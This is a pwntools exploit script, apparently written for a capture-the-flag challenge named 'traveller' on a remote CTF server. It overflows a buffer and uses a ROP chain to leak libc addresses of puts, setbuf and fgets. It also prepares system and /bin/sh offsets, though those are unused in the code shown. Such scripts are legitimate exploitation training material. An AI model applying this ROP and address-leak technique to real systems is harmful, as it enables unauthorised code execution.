#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
# from ctypes import CDLL

context.terminal = ["tmux", "splitw", "-h"]
# context.log_level = 'error' # se non vuoi vedere i loggin
exe = context.binary = ELF(args.EXE or './traveller_patched')
# lib = CDLL(exe.libc.path)
host = args.HOST or 'traveller.chall.srdnlen.it'
port = int(args.PORT or 443)

def unpack(txt):
    return u64(txt.ljust(8, b'\x00'))

def vers_libc(function):
    return ELF(pwnlib.libcdb.search_by_symbol_offsets(function, select_index=10))

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port, ssl=True)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
b *0x4011e8
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

rdi = 0x4012b3
gotPuts = 0x404018
gotSetBuf = 0x404020
gotPrintf = 0x404028
gotFgets = 0x404030
puts = 0x401030
bss = 0x404250 
adjust = 0x4012d4 # ret
tmp = 0x402021 # We are departing
tmp1 = 0x402004 # What is your destination
main = 0x401156
ticket = 0x401191
init = 0x401215
leave = 0x401213
retstart = 0x401070

dati = 0x404038

binsh = 0x1cb42f
system  = 0x58750
offPuts = 0x87be0

nop = asm("nop")


# print(0x200)
payload = flat(rdi, gotPuts, p64(puts), retstart)

io.sendlineafter(b"> ",  nop * (512 - 8 - len(payload)) + p64(adjust) + payload + p64(bss))

# print(hex(exe.got['puts']))
io.recvline() # We are departing
# sleep(3)
leakPuts = unpack(io.recvline().strip())
# leakPrintf = unpack(io.recvline().strip())
leakSetBuf = unpack(io.recvline().strip())
leakFgets = unpack(io.recvline().strip())
print("puts",hex(leakPuts))
# print("printf",hex(leakPrintf))
print("setbuf",hex(leakSetBuf))
print("fgets",hex(leakFgets))

io.interactive()

